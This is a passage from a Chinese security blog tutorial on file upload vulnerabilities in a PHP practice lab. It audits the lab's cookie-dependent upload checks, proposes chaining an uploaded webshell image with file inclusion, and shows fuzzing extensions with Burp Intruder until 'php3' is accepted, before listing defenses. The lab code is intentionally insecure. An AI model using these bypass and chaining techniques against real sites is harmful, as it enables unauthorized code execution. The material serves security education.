+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;security_level&quot;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;0&quot;</span> :</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;images/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;1&quot;</span> :</span><br><span class="line">            <span class="variable">$file_error</span> = file_upload_check_1(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$file_error</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;images/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;2&quot;</span> :</span><br><span class="line">            <span class="variable">$file_error</span> = file_upload_check_2(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$file_error</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;images/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> :</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;images/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是通过cookie的level来判断防护的等级，而最高级cookie level通过burp suite发现是2，因此重点观察<code>file_upload_check_2</code>函数</p>
+<p>然后重点逻辑如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_array</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">   <span class="comment">// Puts the last part of the array (= the file extension) in a new variabele</span></span><br><span class="line">   <span class="comment">// Converts the characters to lower case</span></span><br><span class="line">   <span class="variable">$file_extension</span> = strtolower(<span class="variable">$file_array</span>[count(<span class="variable">$file_array</span>) - <span class="number">1</span>]);</span><br><span class="line">   <span class="comment">// Searches if the file extension exists in the &#x27;allowed&#x27; file extensions array   </span></span><br><span class="line">   <span class="keyword">if</span>(!in_array(<span class="variable">$file_extension</span>, <span class="variable">$file_extensions</span>))</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      <span class="variable">$file_error</span> = <span class="string">&quot;Sorry, the file extension is not allowed. Only the following extensions are allowed: &lt;b&gt;&quot;</span> . join(<span class="string">&quot;, &quot;</span>, <span class="variable">$file_extensions</span>) . <span class="string">&quot;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$file_error</span>;</span><br><span class="line">      </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Checks if the file already exists in the directory</span></span><br><span class="line">   <span class="keyword">if</span>(is_file(<span class="string">&quot;<span class="subst">$directory</span>/&quot;</span> . <span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="variable">$file_error</span> = <span class="string">&quot;Sorry, the file already exists. Please rename the file...&quot;</span>;     </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$file_error</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到逻辑代码非常的严密，并且调用的函数<code>explode</code>和<code>in_array</code>也并没有可利用的漏洞</p>
+<p>通过源码审计，我们可以发现我们无法同时满足以下两个条件：</p>
+<ol>
+<li>保证上传的文件名类型满足jpg/png；</li>
+<li>保证存储的文件名为php/php3等类型；</li>
+</ol>
+<p>因此该文件上传点我们无法直接利用。  </p>
+<p>那么我们该如何利用这个文件上传漏洞呢？<br>答案是通过漏洞之间的联合利用，基于我们已经成功上传一句话木马内容的jpg，联合使用<strong>本地/远程文件包含</strong>漏洞，既可以完成本次渗透。  </p>
+<h2 id="fuzz模糊测试"><a href="#fuzz模糊测试" class="headerlink" title="fuzz模糊测试"></a>fuzz模糊测试</h2><p>模糊测试(fuzz testing, fuzzing)是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言(assertion) 失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。</p>
+<p>模糊测试最早由威斯康星大学的Barton Miller于1988年提出。他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件,并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。</p>
+<p>回到之前的文件上传漏洞，难度调为mid，并且上传<code>shell.php</code></p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207164434318.png" alt="image-20221207164434318"></p>
+<p>在instruder中选择php文件后缀进行fuzz操作</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207164953759.png" alt="image-20221207164953759"></p>
+<p>可以看到不同的反馈，php3的response长度与php的response长度不同，因此这个可能成功了，点击查看response并且查找相应关键字可以发现的确成功了</p>
+<p><img src="/../images/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20221207165149462.png" alt="image-20221207165149462"></p>
+<p>模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用；而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。</p>
+<p>使用过程有几点需要注意：</p>
+<ol>
+<li>Fuzz过程由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃。</li>
+<li>Fuzz过程会产生大量负载，可能会对生产环境造成影响。</li>
+<li>安全监测过程中很容易由于过多访问触发安全警报，进而为后续安全检测制造障碍。<br> 因此Fuzz多用于非生产环境，在生产环境使用要十分慎重。</li>
+</ol>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol>
+<li>文件类型检测：白名单 优于 黑名单</li>
+<li>使用安全的函数进行编程</li>
+<li>熟悉业务部署环境的OS、Web Server配置  </li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">长烟</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yunf194.github.io/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">http://yunf194.github.io/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yunf194.github.io" target="_blank">fengyun's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">web安全攻防</a></div><div class="post_share"><div class="social-share" data-image="/images/cover/2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/07/2022127-SQL%E6%B3%A8%E5%85%A5/"><img class="prev-cover" src="/images/cover/2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入</div></div></a></div><div class="next-post pull-right"><a href="/2022/10/23/20221023-Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%8C%85/"><img class="next-cover" src="/images/cover/p25.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Go语言基础之包</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/12/07/2022127-SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src="/images/cover/2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-07</div><div class="title">SQL注入</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://yunf194.github.io/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">长烟</div><div class="author-info__description">交际是分享快乐，独处是消化自我</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">116</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yunf194"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yunf194" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2846327307@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我明白你会来所以我等</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">后缀名绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%B3%E8%81%94%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">服务器关联型漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-5-x-6-0-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">IIS 5.x &#x2F; 6.0 解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">Nginx 解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">Apache 解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">前端验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">.htaccess绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%96%87%E4%BB%B6%E6%B5%81%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">windows文件流绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">%00截断绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">文件头检测绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">10.</span> <span class="toc-text">源码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">11.</span> <span class="toc-text">fuzz模糊测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">12.</span> <span class="toc-text">防御措施</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/07/202317-%E5%9F%BA%E4%BA%8EGO%E7%9A%84%E5%8F%8C%E5%90%91tls%E9%80%9A%E4%BF%A1/" title="基于GO的双向tls通信"><img src="/images/cover/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于GO的双向tls通信"/></a><div class="content"><a class="title" href="/2023/01/07/202317-%E5%9F%BA%E4%BA%8EGO%E7%9A%84%E5%8F%8C%E5%90%91tls%E9%80%9A%E4%BF%A1/" title="基于GO的双向tls通信">基于GO的双向tls通信</a><time datetime="2023-01-06T16:00:00.000Z" title="发表于 2023-01-07 00:00:00">2023-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/07/2022127-SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img src="/images/cover/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/12/07/2022127-SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">SQL注入</a><time datetime="2022-12-06T16:00:00.000Z" title="发表于 2022-12-07 00:00:00">2022-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><img src="/images/cover/2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞"/></a><div class="content"><a class="title" href="/2022/12/06/2022127-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2022-12-05T16:00:00.000Z" title="发表于 2022-12-06 00:00:00">2022-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/23/20221023-Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%8C%85/" title="Go语言基础之包"><img src="/images/cover/p25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go语言基础之包"/></a><div class="content"><a class="title" href="/2022/10/23/20221023-Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%8C%85/" title="Go语言基础之包">Go语言基础之包</a><time datetime="2022-10-22T16:00:00.000Z" title="发表于 2022-10-23 00:00:00">2022-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/22/20221022-Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%87%BD%E6%95%B0/" title="Go语言基础之函数"><img src="/images/cover/p25.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go语言基础之函数"/></a><div class="content"><a class="title" href="/2022/10/22/20221022-Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E5%87%BD%E6%95%B0/" title="Go语言基础之函数">Go语言基础之函数</a><time datetime="2022-10-21T16:00:00.000Z" title="发表于 2022-10-22 00:00:00">2022-10-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/cover/2.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By 长烟</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">其实，我回头等了你好久好久，你都没来</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'Yb0FJoeuYRJfbYGupEnFsg6E-gzGzoHsz',
+      appKey: 'Pjo4dvB3TbjfY8clnS7fxalh',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://yunf194.github.io/css/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://yunf194.github.io/css/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
